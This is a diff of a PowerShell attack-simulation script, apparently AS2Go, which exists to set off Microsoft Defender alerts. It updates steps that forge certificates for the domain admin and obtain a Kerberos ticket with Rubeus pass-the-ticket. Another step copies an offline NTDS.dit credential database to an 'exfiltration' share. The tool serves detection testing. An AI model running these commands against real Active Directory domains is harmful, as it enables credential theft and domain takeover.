@@ -20,7 +20,7 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-11-10
+last update: 2022-11-13
 File Name  : AS2Go.ps1 | Version 2.5.8
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
@@ -46,7 +46,8 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-# 2022-11-10 | v2.5.8 |  Attack - Steal or Forge Authentication Certificates
+# 2022-11-13 | v2.5.9 |  Attack - Steal or Forge Authentication Certificates
+# 2022-11-12 | v2.1.0 |  Update Function Get-Directories
 # 2022-11-08 | v2.5.7 |  add developer mode switch, add -ScriptBlock {} and region to source code
 # 2022-11-04 | v2.5.6 |  ADD Function New-PasswordSprayAttack
 # 2022-10-15 | v2.5.5 |  ADD Function Kerberoasting
@@ -180,7 +181,7 @@ Write-Log -Message "### Start Function $myfunction ###"
 #region ################## main code | out- host #####################
 
 #$password = Read-Host "Enter password for pfx file - $pfxFile"
-$request = ".\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt"
+$request = ".\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt"
 
 Write-Host "`nNext Step:"
 Write-Host $request -ForegroundColor $global:FGCCommand
@@ -237,7 +238,7 @@ Write-Log -Message "### Start Function $myfunction ###"
 $PfxFile = $pemFile.tolower().Replace("pem","pfx")
 
 Write-Host "`nNext Step:"
-$convert = "openssl pkcs12 -in .\$pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out .\$pfxFile"
+$convert = "openssl pkcs12 -in $pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out $pfxFile"
 Write-Log -Message  $convert
 Write-Host $convert -ForegroundColor $global:FGCCommand
 pause
@@ -257,8 +258,8 @@ $StartOpenSSL = Get-KeyValue -key "OpenSSL"
 Invoke-Item $StartOpenSSL | Out-Host
 Start-Sleep -Milliseconds 800
 pause
-Get-Item .\$pfxFile | Out-Host
-
+Get-Item $pfxFile | Out-Host
+pause
 
 
 Write-Log -Message "    >> using $PfxFile"
@@ -784,14 +785,16 @@ Write-Log -Message "### End Function $myfunction ###"
 
 function Get-Directories {
     param ([string] $Path)
-
-    Write-Host "Get-ChildItem -Path $Path  -ErrorAction Stop | where {$_.PsIsContainer}" -ForegroundColor $global:FGCCommand
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+    Write-Host "Get-ChildItem -Path $Path -Directory" -ForegroundColor $global:FGCCommand
 
     Try
     {
 
     # Code to get or create objects here.
-    $dirs = Get-ChildItem -Path $Path  -ErrorAction Stop | where {$_.PsIsContainer} 
+    Get-ChildItem -Path $Path  -ErrorAction Stop | Out-Host
     # Explicitly return data to the caller.
     
     }
@@ -803,7 +806,11 @@ function Get-Directories {
     }
     # Explicitly return data to the caller.
     $dirs | Out-File -FilePath $scriptLog -Append
-    return $dirs
+    
+    Write-Log -Message "    >> using Get-ChildItem -Path $Path -Directory"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+    return $true
 }
 
 function Get-Files {
@@ -814,7 +821,7 @@ function Get-Files {
     $files = " "
     Try
     {
-    $files = Get-ChildItem -Path $Path -Filter $FileType -ErrorAction SilentlyContinue
+    $files = Get-ChildItem -Path $Path -Filter $FileType -ErrorAction SilentlyContinue | Out-Host
     }
     Catch
     {
@@ -1343,16 +1350,21 @@ Pause
 Clear-Host
 
 If ($showStep){Show-Step step_011.html}
+
 Write-Host "____________________________________________________________________`n" 
 Write-Host "                  Data exfiltration over SMB Share                  "
 Write-Host "____________________________________________________________________`n" 
 Pause
+
 New-Item $exfiltration -ItemType directory -ErrorAction Ignore
-write-host " Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration" -ForegroundColor $global:FGCCommand
+
+write-host "   Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration" -ForegroundColor $global:FGCCommand
 Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration
+
 write-host ""
-write-host "Get-Item $exfiltration\*.dit" -ForegroundColor $global:FGCCommand
-Get-Item .\*.dit -Force
+
+write-host "   Get-Item $exfiltration\*.dit" -ForegroundColor $global:FGCCommand
+Get-Item "$exfiltration\*.dit" | Out-Host
 Pause
 
 #####
@@ -2169,9 +2181,9 @@ Get-ADComputer -Filter * -Properties $attributes | Select -Property $attributes 
 Write-Host ""
 #workaround
 $directory = "\\$mySAW\c$"
-(Get-Directories -Path $directory) | Out-File -FilePath $tmp
-Get-Content -Path $tmp
-
+#(Get-Directories -Path $directory) | Out-File -FilePath $tmp
+#Get-Content -Path $tmp
+Get-Directories -Path $directory
 
 
 Pause
@@ -3034,7 +3046,7 @@ Write-Host "____________________________________________________________________
 
 
 
-$mydebug = Get-KerberosTGT -pfxFile .\$pfxFile -altname $domainadmin
+$mydebug = Get-KerberosTGT -pfxFile $pfxFile -altname $domainadmin
 
 
 $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
